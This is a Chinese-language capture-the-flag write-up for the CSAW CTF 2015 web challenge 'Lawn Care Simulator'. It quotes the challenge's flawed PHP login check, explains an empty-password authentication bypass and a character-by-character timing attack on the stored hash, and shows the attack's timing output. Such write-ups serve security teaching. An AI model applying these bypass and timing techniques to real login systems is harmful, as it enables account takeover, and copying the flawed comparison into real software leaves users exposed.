# Lawn Care Simulator
	Category: Web Points: 200 Description:

	http://54.165.252.74:8089/

## Write-up
在本地模拟了一下比赛的环境，得到flag。

### method 1
利用git泄露下载源码，分析如下代码:  

	require_once 'db.php';
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
    mysql_select_db('users') or die("Mysql error");
    $user = mysql_real_escape_string($user);
    $query = "SELECT hash FROM users WHERE username='$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    $hash = $line['hash'];

    //这里存在问题,应该添加 $hash==NULL的判断
    //假设用户名不存在则 $hash 为空， $pass 输入也是为空，便可通过验证。
    
    if (strlen($pass) != strlen($hash))
        return False;
	echo $pass."</br>";
	echo $hash."</br>"; 
	
    $index = 0;
    while($hash[$index]){   //字节判断  存在基于时间的注入  假设某位为0 这个便不成立，直接跳出循环。
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);  //0.3s
        $index+=1;
    }
    return true;

输入 `username=admin & password=`  
即可绕过检查得到flag  

### method 2
得到username,在测试页面username中输入`%`，可得到用户名 `~~FLAG~~`  

基于时间的注入。写个python脚本，跑出hash值。结果如下:    

	30round : password is [242cb962ac59475b964b47152d234b7] *. 
	31round : [0] spend 9.322 seconds. 
	31round : [1] spend 9.334 seconds. 
	31round : [2] spend 9.322 seconds. 
	31round : [3] spend 9.314 seconds. 
	31round : [4] spend 9.322 seconds. 
	31round : [5] spend 9.333 seconds. 
	31round : [6] spend 9.32 seconds. 
	31round : [7] spend 9.322 seconds. 
	31round : [8] spend 9.322 seconds. 
	31round : [9] spend 9.349 seconds. 
	31round : [a] spend 9.313 seconds. 
	31round : [b] spend 9.313 seconds. 
	31round : [c] spend 9.322 seconds. 
	31round : [d] spend 9.334 seconds. 
	31round : [e] spend 9.623 seconds. 
	31round : [f] spend 9.323 seconds. 
	31round : password is [242cb962ac59475b964b47152d234b7e] *. 

## 参考
[https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Web/Lawn-Care-Simulator](https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Web/Lawn-Care-Simulator)  
[https://github.com/bl4de/ctf/blob/master/CSAW_CTF_2015/LawnCareimulator_Web200_writeup.md](https://github.com/bl4de/ctf/blob/master/CSAW_CTF_2015/LawnCareimulator_Web200_writeup.md "https://github.com/bl4de/ctf/blob/master/CSAW_CTF_2015/LawnCareimulator_Web200_writeup.md")
